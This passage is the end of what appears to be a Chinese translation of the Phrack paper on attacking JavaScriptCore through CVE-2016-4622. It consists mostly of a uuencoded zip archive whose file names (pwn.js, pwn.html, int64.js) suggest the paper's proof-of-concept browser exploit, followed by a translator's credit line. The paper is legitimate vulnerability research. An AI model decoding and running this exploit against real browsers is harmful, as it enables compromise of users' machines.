M47'-@F[2[N;IAX^'/?U::_[H9(.SV`+KL'<5'5?6QKK-X<9O+6MJN@<%ZV9=
M5!8ZO[FXGA"AH/;-^0>@/Z^D\H^?B&:^&<V%+72^+B2,$W$)))>B_9M4CT+M
MV=P96NB?7+/WN$5MCA`.R_H>/DQ6M+:Z!;0M`QOK1$?NJ\/KNQX4=&4QVE'\
M?!/LVA"Y8_/Q!S<><[0O?B5)-ZHM_EB7U3ZCB#:LT;TUK!S]-P"[8\OK"S85
M_Y1N!WP=Z79I<-39"@?QYZY@_'S-/N%2&PPZFFY%!/G^?XC'+J`C?7>@[6'&
M#3JZ!OB6X[NP'5%=OP-@!ZN[V1]-G<?)<&M)CKKA*WG3^&T2,R6J`Q7-W*>F
M7Y[:60&XS:F]81=26G\-CQU*)N85EF`=C=.0^GS%<C'EC;(CUH^@;1$)NU_&
M*Y[1TUWH.AYA#-`-QD3H*3"`_5Y_]FJ1O;>G_1[0EEJ?VSW+T+K=^2'1[31*
M_PBQC?;N9<7K@ZY6,4ZTHCSO6G#23I)MMVT?/6'"EL91<K<?T^.C=A38>O[0
MVOK?_&KOQQ/)+M\Z<N_RC?8]\`4MTTVQU,B7\/%D=\0OW&3\3=!<GCM+6SF4
M%8*;%4T8IJD7$D)98@2!]EH`6)GUESY*L7SR+.<5YKV?3TX6TDA[AL:/>E\.
MTVU'HCDL=N;P"/^Y<HN6_^?`OW<C;UL=]J[9,\0(K5_<?Q`Y_UYKN\'U\&@1
M"S1\EVYQV-BB1=YQW3V^=N$/HP8]1^F'L]"%/)>#8.*.L?0_6SCRUVT>F6@?
MD$<IY]I]_/#&"0D#D35"3>E)3@T',)I-/#U#7PN:DDQI0QMA0+1#+HVW@.YO
M>J[['U!+`P04````"`"Z;D9)MPF8]%<#``!?"```#``<`'-R8R]U=&EL<RYJ
M<U54"0`#4#OV5]>J]E=U>`L``03U`0``!%````"E5>%NVS80_N^GN!88+,.>
M[#A#$,3S@+9PBP)=,33I@"$+"EJB(JX4*9"4,Z'(L^QA^F*](R6+2A,,V/1'
MPMW'.WX?OZ.6R\ER"1^=D,*U4#0J<T(KFV*4$J]TW1IQ6SI(LAFL5R=G<,FJ
MADMX8_37?PA%L`_<-4:!*SF4_&^6\TQ43(+AM>&6*\>H*.C"(V[%@2O8MXZG
MD[XA+4OV,_@R`7Q,*)=,5U.8PSYU^M(9H6Z3D[/9++7-WCJ3_+B>;2;W_Z<]
M,&-8.]Z$%$6;4-+VFSDP@Y4L;.'Z9N,CA3:04%A@<+7!U\^^GDTE5[>NQ,A\
M/O/0P,:F=6/+Q',DW+6XF>'F8ZX$^DL+E4RGC]':"\5,"SES;*#%<VP;<<+Z
M/77K]8JH-:HGAV_,]NQ$`5VDVSS\`&O8;N%D(.!*H^]`\3NX:FN^,T:;Y/E;
M=6!2Y-2TZ_:\IT32>)XH#ZWZ*)0[?T%:/VBU!#K#IR0=82DTWR+^N*M.R>7Z
M!I?4S%C^5KF^0><1L<`5"T#;C-7V:[W,\=GG354G)'$LCD/*Z!P*IR__N-I=
M?OIM]^'3[MWNU]W[*WB&2DT;E?-"*)Y/A]WYD]J"9YT61E>A<*20Q!7_YBK?
M=20`4NDVU]?)RD9]QB4>:Z7(.-$6<T\Z!J)&CAKZ!6G%:A(KPA!;C^F/YQ<X
M'PC1$[*V]DW.%[!:P!2F40G/*9@]8(.E$=.![D?'$.`!\Z<:C'\I*NQ1"#3X
M@1L;#:\5E9#,R!84JS!=MZ[$;*7S1N)U0C3QJF@RASR3_FR37C(L_4)*G3&<
M?:QF.6B5X:<&=M#HY4;QC%M+DU9R5@,+8+H0(6_(XRA!]GG9*'J!KKEAW75Y
M]'U3%-P$-8+[O05>^G!RWLG03\CO`@%'9#0GH4R$;C!WN@[X`7VZ?@)>2,W<
MV4\>'^"O0^0!/CZ-P5;$[N+X,_`CL,"RLN&Q^?I>A]"$4)L^3H?(\=KB4M^-
M%R#X>D4CZ^MM1LEN(X]JX=U&/;Z?PLB`]XO)\3N<TG<\1I=[[/WX"O>#_42W
MT4)ZPOWXX%ZD:O[_<KP6_[-FO5-2RUWW;WI4MT[;Q]4@[Q\8#L]><M^W,ZUG
MCUI?Q)T6<>IT3;G!@$.R<]E%;+<PYCC)LP1W^0U02P$"'@,*``````!1KD9)
M````````````````!``8`````````!``[4$`````<W)C+U54!0`#":OV5W5X
M"P`!!/4!```$4````%!+`0(>`Q0````(`!>N1DFX3#HD=P,``"8)```.`!@`
M``````$```"D@3X```!S<F,O96UA:6PN:'1M;%54!0`#G:KV5W5X"P`!!/4!
M```$4````%!+`0(>`Q0````(`/1N1DD56OBT%@8``&@2```,`!@```````$`
M``"D@?T#``!S<F,O:6YT-C0N:G-55`4``[L[]E=U>`L``03U`0``!%````!0
M2P$"'@,4````"``/KD9)E(.)\4P#``!0"```#``8```````!````I(%9"@``
M<W)C+W!W;BYH=&UL550%``..JO97=7@+``$$]0$```10````4$L!`AX#%```
M``@`)*Y&2>G85Y(7"@``Z!H```H`&````````0```*2!ZPT``'-R8R]P=VXN
M:G-55`4``[.J]E=U>`L``03U`0``!%````!02P$"'@,4````"`"Z;D9)MPF8
M]%<#``!?"```#``8```````!````I(%&&```<W)C+W5T:6QS+FIS550%``-0
H._97=7@+``$$]0$```10````4$L%!@`````&``8`Y`$``.,;````````
`
end
```

> 翻译自Jirairya,译者水平有限，有错误和不当之处，望大佬指出。原文出处：[Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622](http://www.phrack.org/papers/attacking_javascript_engines.html)